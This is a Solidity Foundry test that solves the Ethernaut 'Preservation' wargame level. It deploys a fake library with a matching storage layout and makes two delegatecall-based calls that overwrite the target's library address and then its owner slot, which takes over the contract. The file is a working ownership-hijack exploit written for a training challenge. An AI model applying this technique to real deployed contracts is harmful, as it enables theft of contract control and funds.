pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {EthernautTest} from "./EthernautTest.sol";

interface IPreservation {
    function timeZone1Library() external view returns (address);

    function timeZone2Library() external view returns (address);

    function setFirstTime(uint256) external;

    function setSecondTime(uint256) external;
}

contract Attacker {
    IPreservation p;

    constructor(IPreservation _p) {
        p = _p;
    }

    function attack() external {}
}

contract FakeLibrary {
    address x;
    address y;
    address owner;

    function setTime(uint256 _time) public {
        owner = address(uint160(_time));
    }
}

contract Ethernaut16 is EthernautTest {
    constructor() EthernautTest(16) {}

    function solve() internal override(EthernautTest) {
        FakeLibrary fake = new FakeLibrary();

        IPreservation(instance).setSecondTime(uint256(uint160(address(fake))));
        IPreservation(instance).setFirstTime(uint256(uint160(address(this))));
    }
}
